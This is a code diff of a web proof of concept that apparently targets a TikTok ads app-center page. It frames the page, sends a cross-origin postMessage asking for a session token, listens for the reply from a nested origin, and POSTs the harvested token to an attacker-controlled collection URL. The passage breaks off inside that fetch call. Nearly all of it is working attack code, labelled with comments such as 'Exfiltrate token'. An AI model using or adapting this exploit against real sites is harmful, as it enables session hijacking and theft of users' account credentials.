@@ -1,26 +1,19 @@
-<iframe id="victim" src="https://ads.tiktok.com/app-center/apps/1234" style="width:0;height:0;border:0;"></iframe>
+<iframe id="victim" src="https://ads.tiktok.com/app-center/apps/1234" style="width:100%; height:500px;"></iframe>
 
 <script>
-    const targetOrigin = "https://imuu.xyz"; // frame[0].frames[0]'s origin you spotted earlier
+    const nestedOrigin = "https://imuu.xyz";
 
     document.getElementById('victim').onload = function() {
-        const victimWindow = this.contentWindow;
-
-        // Use try-catch to probe deeper cross-origin access limits
-        try {
-            // Instead of accessing victimWindow.frames[0], 
-            // let's try to "blindly" send the message downward via "*"
-            victimWindow.postMessage({ action: "getSessionToken" }, "*");
-        } catch (e) {
-            console.warn("Direct postMessage failed:", e);
-        }
+        const victimWin = this.contentWindow;
+        
+        // PostMessage goes inside TikTok’s iframe now sitting on YOUR domain
+        victimWin.postMessage({ action: "getSessionToken" }, "*");
     };
 
-    // Capture token coming back from imuu.xyz
     window.addEventListener('message', (e) => {
-        if (e.origin === targetOrigin && e.data && e.data.token) {
-            console.log("🎯 GOT SESSION TOKEN:", e.data);
-
+        if (e.origin === nestedOrigin && e.data && e.data.token) {
+            console.log("🔥 Token harvested:", e.data);
+            // Exfiltrate token
             fetch('https://attacker.com/collect', {
                 method: 'POST',
                 mode: 'no-cors',
